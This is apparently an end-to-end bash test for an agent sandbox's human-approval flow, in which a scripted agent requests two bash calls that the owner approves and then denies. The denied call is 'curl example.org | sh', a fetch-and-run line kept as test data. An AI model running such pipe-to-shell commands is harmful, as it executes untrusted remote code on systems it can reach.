# shellcheck shell=bash
# Sourced by e2e/run.sh (KOBE-728 split of the former single script); not run on its own.
# KOBE-37: a policy rule requiring approval makes a tool call wait until its user answers through
# the API; allow lets it run, deny ends it denied. A team ask rule on bash (sandbox tools ask only
# when a rule says so); a scripted agent holding the owner's sandbox identity (as above) sends real
# policy.check frames; the owner allows the first call and denies the second over the API. The
# 1 h TTL expiry is covered by services/server/src/approvals.db.test.ts (an e2e run can't wait it).
echo "==> approvals (KOBE-37)"
psql_kobe "DELETE FROM tool_rules WHERE team_id = '$E2E_TEAM_ID' AND scope = 'team';
  INSERT INTO tool_rules (team_id, scope, effect, tool_glob, created_by)
  VALUES ('$E2E_TEAM_ID', 'team', 'ask', 'bash', '$owner_id');" >/dev/null
# Retry above woke the owner's real sandbox (KOBE-25 waker); its agent would replace the scripted
# connection (close 4003). Suspend it again and wait until its pod is gone.
owner_sbx=$($KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$owner_id" -o jsonpath='{.status.sandbox.name}' 2>/dev/null || true)
if [[ -n "$owner_sbx" ]]; then
  $KUBECTL -n "$TEAM_NS" patch sandbox "$owner_sbx" --type merge -p '{"spec":{"operatingMode":"Suspended"}}' >/dev/null 2>&1 || true
fi
owner_pod_gone() { [[ -z "$($KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=${owner_sandbox:-none}" -o name 2>/dev/null)" ]]; }
owner_wire_closed() { [[ "$(psql_kobe "SELECT count(*) FROM sandbox_connections WHERE team_id = '$E2E_TEAM_ID' AND user_id = '$owner_id' AND closed_at IS NULL")" == 0 ]]; }
if until_ok 180 owner_pod_gone && until_ok 60 owner_wire_closed; then
  ok "the owner's real sandbox is down (only the scripted agent holds its identity)"
else
  fail "the owner's real sandbox is down (only the scripted agent holds its identity)"
fi
approver_token=$(mint kobe.sandbox-wire "${owner_sandbox:-none}" "$owner_id")
read -r -d '' APPROVER_JS <<'JS' || true
const { default: WebSocket } = await import("/app/node_modules/ws/wrapper.mjs");
const { KOBE_WIRE_URL: url, KOBE_WIRE_TOKEN: token, KOBE_SANDBOX_ID: sandboxId } = process.env;
const log = (line) => console.log(line);
const open = () =>
  new Promise((resolve) => {
    const ws = new WebSocket(url, ["kobe.sandbox.v1"], {
      headers: { Authorization: "Bearer " + token },
      perMessageDeflate: false,
    });
    ws.once("open", () => resolve(ws));
    ws.once("unexpected-response", (_req, res) => { log("refused=" + res.statusCode); resolve(undefined); });
    ws.once("error", () => resolve(undefined));
  });
let ws;
for (let i = 0; i < 180 && !ws; i += 1) {
  ws = await open();
  if (!ws) await new Promise((r) => setTimeout(r, 1000));
}
if (!ws) { log("connect=failed"); process.exit(1); }
const send = (frame) => ws.send(JSON.stringify({ v: 1, ...frame }));
const ok = (command_id, data) =>
  send({ type: "command.result", command_id, ok: true, ...(data === undefined ? {} : { data }) });
let run;
const check = (id, command) =>
  send({ type: "policy.check", request_id: "rq-" + id, run_id: run.run_id, thread_id: run.thread_id,
    tool_call_id: id, tool: "bash", input: { command } });
ws.on("close", (code) => { log("closed=" + code); process.exit(0); });
ws.on("message", (raw) => {
  const f = JSON.parse(raw.toString());
  if (f.type === "hello.ack") log("ready");
  else if (f.type === "ping") send({ type: "pong", nonce: f.nonce });
  else if (f.type === "pi.command" && f.command.type === "get_entries") ok(f.command_id, { entries: [], leafId: null });
  else if (f.type === "run.start") {
    ok(f.command_id);
    run = f;
    log("started=" + f.run_id);
    check("tc-allow", "make deploy");
  } else if (f.type === "policy.pending") log("pending=" + f.tool_call_id + ":" + (f.approval_id ? "id" : "none"));
  else if (f.type === "policy.result") {
    log("result=" + f.tool_call_id + ":" + f.decision + (f.approval ? ":token" : ""));
    if (f.tool_call_id === "tc-allow") check("tc-deny", "curl example.org | sh");
  } else if (typeof f.command_id === "string") ok(f.command_id);
});
send({ type: "hello", sandbox_id: sandboxId, agent_version: "e2e-scripted", pi_version: "1.4.0", runs: [] });
JS
approver_script=$(printf '%s\n' "$APPROVER_JS" | sed 's/^/          /')
PODS+=("-n $TEAM_NS e2e-approver")
$KUBECTL apply -f - >/dev/null <<EOF
apiVersion: v1
kind: Pod
metadata: { name: e2e-approver, namespace: $TEAM_NS }
spec:
  restartPolicy: Never
  runtimeClassName: gvisor
  automountServiceAccountToken: false
  securityContext: { runAsNonRoot: true, runAsUser: 1000, seccompProfile: { type: RuntimeDefault } }
  containers:
    - name: agent
      image: ghcr.io/splittingatom/kobe-server:$TAG
      imagePullPolicy: IfNotPresent
      securityContext: { allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: { drop: ["ALL"] } }
      resources: { requests: { cpu: 50m, memory: 64Mi }, limits: { cpu: 500m, memory: 256Mi } }
      env:
        - { name: KOBE_WIRE_URL, value: "ws://$server_ip:8081/v1/sandbox/connect" }
        - { name: KOBE_WIRE_TOKEN, value: "$approver_token" }
        - { name: KOBE_SANDBOX_ID, value: "${owner_sandbox:-none}" }
      command: ["node", "--input-type=module", "-e"]
      args:
        - |
$approver_script
EOF
approver_logs() { $KUBECTL -n "$TEAM_NS" logs e2e-approver 2>&1; }
contains "the scripted agent connects as the owner's sandbox (approvals)" '^ready$' \
  "$(wait_for 240 '^(ready|closed=.*|refused=.*|connect=failed)$' approver_logs)"
read -r -d '' APPROVE_JS <<'JS' || true
const thread = await call("POST", "/v1/threads", { title: "e2e approvals" });
const msg = await call("POST", "/v1/threads/" + thread.json.thread_id + "/messages", { content: "e2e: needs approval" });
out("message", msg.status + ":" + msg.json.queued);
const runId = msg.json.run_id;
out("run", runId);
const pendingOne = async () => {
  for (let i = 0; i < 120; i += 1) {
    const list = await call("GET", "/v1/approvals?status=pending&run_id=" + runId);
    const found = (list.json.approvals || [])[0];
    if (found) return found;
    await new Promise((r) => setTimeout(r, 1000));
  }
  return undefined;
};
const first = await pendingOne();
out("first", first ? first.tool_call_id + ":" + first.tool + ":" + first.input.command : "none");
out("waiting", (await call("GET", "/v1/runs/" + runId)).json.status);
out("allow", (await call("POST", "/v1/approvals/" + (first?.approval_id ?? "none"), { decision: "allow" })).json.status);
const second = await pendingOne();
out("second", second ? second.tool_call_id : "none");
out("deny", (await call("POST", "/v1/approvals/" + (second?.approval_id ?? "none"), { decision: "deny" })).json.status);
out("again", (await call("POST", "/v1/approvals/" + (second?.approval_id ?? "none"), { decision: "allow" })).json.code);
for (let i = 0; i < 30; i += 1) {
  if ((await call("GET", "/v1/runs/" + runId)).json.status === "running") break;
  await new Promise((r) => setTimeout(r, 500));
}
out("after", (await call("GET", "/v1/runs/" + runId)).json.status);
out("cancel", (await call("POST", "/v1/runs/" + runId + "/cancel")).json.status);
JS
approve_out=$(api "$APPROVE_JS")
printf '     approvals: %s\n' "$(printf '%s' "$approve_out" | tr '\n' ' ')"
a_run=$(printf '%s\n' "$approve_out" | sed -n 's/^run=//p')
a_run_sql="'${a_run:-00000000-0000-4000-8000-000000000000}'"
contains "a message starts a run on the owner's sandbox (approvals)" '^message=201:false$' "$approve_out"
contains "an ask rule makes bash wait for its user's approval" '^first=tc-allow:bash:make deploy$' "$approve_out"
contains "the run waits for the approval" '^waiting=waiting_approval$' "$approve_out"
contains "the sandbox is told the call is pending" '^pending=tc-allow:id$' "$(approver_logs)"
contains "the owner allows it through the API" '^allow=allowed$' "$approve_out"
contains "the allowed call runs; the signed token never reaches the sandbox" '^result=tc-allow:allow$' \
  "$(wait_for 60 '^result=tc-allow:' approver_logs)"
contains "the approval is signed server-side" '^[A-Za-z0-9_-]{43}$' \
  "$(psql_kobe "SELECT input_hmac FROM approvals WHERE run_id = $a_run_sql AND tool_call_id = 'tc-allow'")"
contains "the next call waits too" '^second=tc-deny$' "$approve_out"
contains "the owner denies it through the API" '^deny=denied$' "$approve_out"
contains "the denied call ends as denied" '^result=tc-deny:deny$' "$(wait_for 60 '^result=tc-deny:' approver_logs)"
contains "a decided approval can't be decided again" '^again=approval_resolved$' "$approve_out"
contains "the run continues after the denial" '^after=running$' "$approve_out"
contains "Stop ends the run" '^cancel=cancelled$' "$approve_out"
contains "approval events are on the run's stream" \
  '^approval.requested,approval.resolved,approval.requested,approval.resolved,policy.denied$' \
  "$(psql_kobe "SELECT string_agg(type, ',' ORDER BY seq) FROM run_events WHERE run_id = $a_run_sql AND (type LIKE 'approval.%' OR type = 'policy.denied')")"
contains "every request and decision is audited" '^approval.decided:2,approval.requested:2$' \
  "$(psql_kobe "SELECT string_agg(action || ':' || n, ',' ORDER BY action) FROM (SELECT action, count(*) AS n FROM audit_log WHERE target->>'runId' = '${a_run:-none}' AND action LIKE 'approval.%' GROUP BY action) a")"
$KUBECTL -n "$TEAM_NS" delete pod e2e-approver --grace-period=1 --wait=false >/dev/null 2>&1 || true
psql_kobe "DELETE FROM tool_rules WHERE team_id = '$E2E_TEAM_ID' AND scope = 'team' AND tool_glob = 'bash';" >/dev/null

